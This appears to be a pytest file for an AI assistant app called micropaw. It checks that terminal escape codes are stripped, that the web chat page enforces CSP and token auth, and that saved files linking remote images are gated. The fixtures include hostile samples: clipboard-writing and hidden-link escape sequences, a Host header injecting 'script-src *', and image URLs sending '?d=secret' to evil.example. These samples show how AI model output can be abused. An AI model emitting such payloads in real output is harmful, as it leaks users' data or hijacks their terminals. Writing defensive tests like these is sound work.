"""What a browser, a terminal or a saved file can be made to do with model text."""

from __future__ import annotations

import asyncio
import base64
import hashlib
import io
import json
import os
import re
import socket

import pytest

from micropaw import privacy
from micropaw.channels import terminal
from micropaw.channels.webchat import WebChatChannel, _ws_encode_frame, _ws_read_frame
from micropaw.tools.base import ToolContext
from micropaw.tools.file_write import FileWriteTool
from micropaw.tools.files_tool import FilesTool
from micropaw.tools.outbound_scan import remote_hosts

# --- terminal ---

def test_terminal_controls_are_removed_but_text_and_newlines_stay():
    dirty = "ok\x1b]52;c;ZGF0YQ==\x1b\\ \x1b[31mred\x1b[0m\r\nline\ttab \x07 \x9b31m end"
    assert terminal.clean_text(dirty) == "ok]52;c;ZGF0YQ==\\ [31mred[0m\nline\ttab  31m end"
    assert "\x1b" not in terminal.clean_text(dirty)


def test_a_response_with_clipboard_and_hidden_link_codes_prints_neither(monkeypatch):
    from rich.console import Console
    buf = io.StringIO()
    monkeypatch.setattr(terminal, "console", Console(file=buf, force_terminal=True, width=100))
    ch = terminal.TerminalChannel()
    ch._print_response("[click](https://evil.example/?d=secret) \x1b]52;c;ZGF0YQ==\x07 \x1b]8;;https://evil.example\x1b\\x")
    out = buf.getvalue()
    assert "\x1b]52" not in out and "\x1b]8" not in out and "\x07" not in out
    assert "https://evil.example/?d=secret" in out  # a link shows where it goes, in full


async def test_streamed_chunks_are_cleaned(monkeypatch, capsys):
    ch = terminal.TerminalChannel()

    async def stream(text, user, platform, channel, on_chunk, **kw):
        await on_chunk("hello \x1b]52;c;ZGF0YQ==\x07 world")
        return "hello"

    ch._stream_handler = stream
    await ch._handle_streaming("hi")
    assert "\x1b]52" not in capsys.readouterr().out


# --- web chat ---

def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


async def _http(port: int, request: str) -> tuple[str, bytes]:
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    writer.write(request.encode())
    await writer.drain()
    data = await reader.read()
    writer.close()
    head, _, body = data.partition(b"\r\n\r\n")
    return head.decode(), body


def _ws_request(path: str, port: int) -> str:
    return (f"GET {path} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {base64.b64encode(os.urandom(16)).decode()}\r\nSec-WebSocket-Version: 13\r\n\r\n")


def _masked(payload: dict) -> bytes:
    raw = json.dumps(payload).encode()
    mask = os.urandom(4)
    return bytes([0x81, 0x80 | len(raw)]) + mask + bytes(b ^ mask[i % 4] for i, b in enumerate(raw))


@pytest.fixture
async def chat():
    port = _free_port()
    ch = WebChatChannel(port=port, auth_token="tok123")

    async def handler(text, user, platform, channel, media=None):
        return f"echo {text}"

    ch.set_handler(handler)
    await ch.start()
    yield ch, port
    await ch.stop()


async def test_page_has_privacy_headers_and_a_csp_that_matches_its_script(chat):
    ch, port = chat
    head, body = await _http(port, f"GET /?token=tok123 HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n\r\n")
    assert head.startswith("HTTP/1.1 200")
    low = head.lower()
    assert "referrer-policy: no-referrer" in low and "cache-control: no-store" in low
    page = body.decode()
    script = re.search(r"<script>(.*?)</script>", page, re.DOTALL).group(1)
    digest = base64.b64encode(hashlib.sha256(script.encode()).digest()).decode()
    csp = next(line for line in head.splitlines() if line.lower().startswith("content-security-policy"))
    assert f"script-src 'sha256-{digest}'" in csp and "default-src 'self'" in csp
    assert f"connect-src 'self' ws://127.0.0.1:{port}" in csp and "img-src 'none'" in csp


async def test_page_turns_off_spellcheck_translation_and_the_token_in_the_address(chat):
    ch, port = chat
    _, body = await _http(port, f"GET /?token=tok123 HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n\r\n")
    page = body.decode()
    assert 'spellcheck="false"' in page and 'autocorrect="off"' in page and 'autocomplete="off"' in page
    assert 'translate="no"' in page and 'content="notranslate"' in page
    assert "history.replaceState" in page and "/ws?token=" not in page
    assert "plain http" not in page  # loopback: no warning


async def test_page_on_a_network_address_warns_about_plain_http(chat):
    ch, port = chat
    ch.host = "0.0.0.0"
    _, body = await _http(port, f"GET /?token=tok123 HTTP/1.1\r\nHost: 192.168.1.9:{port}\r\n\r\n")
    assert "plain http on your network" in body.decode()


async def test_status_and_denied_pages_are_not_cached(chat):
    ch, port = chat
    head, _ = await _http(port, "GET /api/status?token=tok123 HTTP/1.1\r\nHost: x\r\n\r\n")
    assert "cache-control: no-store" in head.lower()
    head, _ = await _http(port, "GET /?token=bad HTTP/1.1\r\nHost: x\r\n\r\n")
    assert head.startswith("HTTP/1.1 401") and "cache-control: no-store" in head.lower()


async def test_a_hostile_host_header_cannot_inject_into_the_csp(chat):
    ch, port = chat
    head, _ = await _http(port, "GET /?token=tok123 HTTP/1.1\r\nHost: a; script-src *\r\n\r\n")
    csp = next(line for line in head.splitlines() if line.lower().startswith("content-security-policy"))
    assert "script-src *" not in csp and "ws:// wss://;" in csp


async def _upgrade(port: int, path: str):
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    writer.write(_ws_request(path, port).encode())
    await writer.drain()
    status = await reader.readuntil(b"\r\n\r\n")
    return reader, writer, status.decode()


async def test_token_as_the_first_message_opens_the_chat(chat):
    ch, port = chat
    reader, writer, status = await _upgrade(port, "/ws")
    assert status.startswith("HTTP/1.1 101")
    writer.write(_masked({"auth": "tok123"}))
    writer.write(_masked({"text": "hi"}))
    await writer.drain()
    texts = []
    for _ in range(3):
        frame = await asyncio.wait_for(_ws_read_frame(reader), 5)
        texts.append(frame[1].decode())
        if "echo hi" in texts[-1]:
            break
    assert any("echo hi" in t for t in texts)
    writer.close()


async def test_wrong_first_message_is_closed_without_an_answer(chat):
    ch, port = chat
    reader, writer, status = await _upgrade(port, "/ws")
    writer.write(_masked({"auth": "nope"}))
    writer.write(_masked({"text": "hi"}))
    await writer.drain()
    frame = await asyncio.wait_for(_ws_read_frame(reader), 5)
    assert frame[0] == 0x8  # close, never a reply
    writer.close()


async def test_old_address_token_still_works_and_a_wrong_one_is_refused(chat):
    ch, port = chat
    _, writer, status = await _upgrade(port, "/ws?token=tok123")
    assert status.startswith("HTTP/1.1 101")
    writer.close()
    _, writer, status = await _upgrade_raw(port, "/ws?token=wrong")
    assert status.startswith("HTTP/1.1 401")


async def _upgrade_raw(port: int, path: str):
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    writer.write(_ws_request(path, port).encode())
    await writer.drain()
    status = await reader.read(100)
    return reader, writer, status.decode()


def test_frame_encoder_roundtrip_still_works():
    assert _ws_encode_frame(0x1, b"hi") == b"\x81\x02hi"


# --- files that link outside ---

@pytest.fixture
def mode():
    def set_mode(m: str) -> None:
        privacy._reset_for_tests()
        privacy.freeze(m)
    yield set_mode
    privacy._reset_for_tests()


def test_scan_ignores_normal_mode_and_other_file_types(mode):
    mode("normal")
    assert remote_hosts("a.html", '<img src="https://evil.example/?d=1">') == []
    mode("local")
    assert remote_hosts("a.py", "x = 'https://evil.example/'") == []
    assert remote_hosts("notes.md", "![](https://evil.example/?d=1) and http://localhost:8080/x") == ["evil.example"]
    assert remote_hosts("a.svg", '<image href="https://a.example/x"/><a href="https://a.example/y">') == ["a.example"]
    assert remote_hosts("go.url", "[InternetShortcut]\nURL=https://b.example/") == ["b.example"]


def _ctx(workspace: str) -> ToolContext:
    return ToolContext(conversation_id="c", user_id="u", platform="terminal", allow_file_write=True,
                       workspace=workspace)


async def test_local_mode_asks_before_writing_a_page_with_remote_images(mode, tmp_path):
    mode("local")
    tool = FileWriteTool()
    args = {"path": str(tmp_path / "index.html"), "content": '<img src="https://evil.example/?d=secret">'}
    ask = tool.needs_approval(args, _ctx(str(tmp_path)))
    assert ask and "evil.example" in ask
    assert tool.needs_approval({**args, "content": "<p>plain</p>"}, _ctx(str(tmp_path))) is None  # inside workspace
    mode("normal")
    assert tool.needs_approval(args, _ctx(str(tmp_path))) is None


async def test_airgapped_mode_refuses_the_write(mode, tmp_path):
    mode("airgapped")
    tool = FileWriteTool()
    out = await tool.execute({"path": str(tmp_path / "n.md"), "content": "![x](https://evil.example/?d=1)"},
                             _ctx(str(tmp_path)))
    assert out.startswith("Error") and "evil.example" in out and not (tmp_path / "n.md").exists()
    ok = await tool.execute({"path": str(tmp_path / "n.md"), "content": "plain text"}, _ctx(str(tmp_path)))
    assert "written" in ok


async def test_files_tool_save_follows_the_same_rule(mode, tmp_path, monkeypatch):
    import micropaw.tools.files_tool as ft
    monkeypatch.setattr(ft, "_FILES_DIR", tmp_path / "files")
    tool = FilesTool()
    args = {"action": "save", "path": "n.md", "content": "![x](https://evil.example/?d=1)"}
    ctx = ToolContext(conversation_id="c", user_id="u", platform="terminal")
    mode("local")
    assert "evil.example" in (tool.needs_approval(args, ctx) or "")
    mode("airgapped")
    assert (await tool.execute(args, ctx)).startswith("Error")
    mode("normal")
    assert tool.needs_approval(args, ctx) is None
    assert (await tool.execute(args, ctx)).startswith("Saved")


# --- blocking work leaves the event loop ---

async def test_pdf_and_file_reads_keep_the_loop_ticking(tmp_path):
    pytest.importorskip("pypdf")
    from pypdf import PdfWriter

    from micropaw.tools.pdf_read import PdfReadTool
    w = PdfWriter()
    for _ in range(300):
        w.add_blank_page(width=200, height=200)
    path = tmp_path / "big.pdf"
    with open(path, "wb") as f:
        w.write(f)
    gaps, stop = [], asyncio.Event()

    async def ticker():
        last = asyncio.get_running_loop().time()
        while not stop.is_set():
            await asyncio.sleep(0.01)
            now = asyncio.get_running_loop().time()
            gaps.append(now - last)
            last = now

    task = asyncio.create_task(ticker())
    ctx = ToolContext(conversation_id="c", user_id="u", platform="terminal", workspace=str(tmp_path))
    out = await PdfReadTool().execute({"path": str(path)}, ctx)
    stop.set()
    await task
    assert "PDF:" in out and max(gaps) < 0.25  # the 50 ms target is for a real PDF on a real board; this one is blank


async def test_blocking_reads_and_writes_use_a_thread(tmp_path, monkeypatch):
    import micropaw.tools.file_read as fr
    import micropaw.tools.files_tool as ft
    calls = []
    real = asyncio.to_thread

    async def spy(fn, *a, **k):
        calls.append(getattr(fn, "__name__", str(fn)))
        return await real(fn, *a, **k)

    monkeypatch.setattr(asyncio, "to_thread", spy)
    monkeypatch.setattr(ft, "_FILES_DIR", tmp_path / "files")
    ctx = ToolContext(conversation_id="c", user_id="u", platform="terminal", workspace=str(tmp_path))
    await FilesTool().execute({"action": "save", "path": "a.txt", "content": "x"}, ctx)
    await FilesTool().execute({"action": "read", "path": "a.txt"}, ctx)
    (tmp_path / "b.txt").write_text("y")
    await fr.FileReadTool().execute({"path": str(tmp_path / "b.txt")}, ctx)
    assert calls.count("write_text") == 1 and calls.count("read_text") == 2
